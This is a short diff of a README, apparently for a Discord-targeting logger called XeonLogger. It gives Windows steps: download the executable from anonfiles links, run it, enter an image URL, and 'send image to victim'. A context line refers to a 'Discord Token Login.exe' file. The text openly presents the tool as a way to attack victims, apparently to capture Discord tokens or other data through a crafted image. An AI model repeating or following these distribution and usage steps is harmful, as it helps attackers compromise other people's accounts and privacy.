@@ -27,12 +27,19 @@ lunch the Discord Token Login.exe File 😉
 
 <details>
 <summary>Windows</summary>
+
 1. Download XeonLogger:
+
     * [Download x64](https://anonfiles.com/qdc6Jdc7zd/XeonLogger_zip)
+
     * [Download x86](https://anonfiles.com/qdc6Jdc7zd/XeonLogger_zip)
+
 2. Extract the file
+
 3. Run XeonLogger.exe
+
 4. Input the image url into the console and press enter
+
 5. Send image to victim
 </details>
 
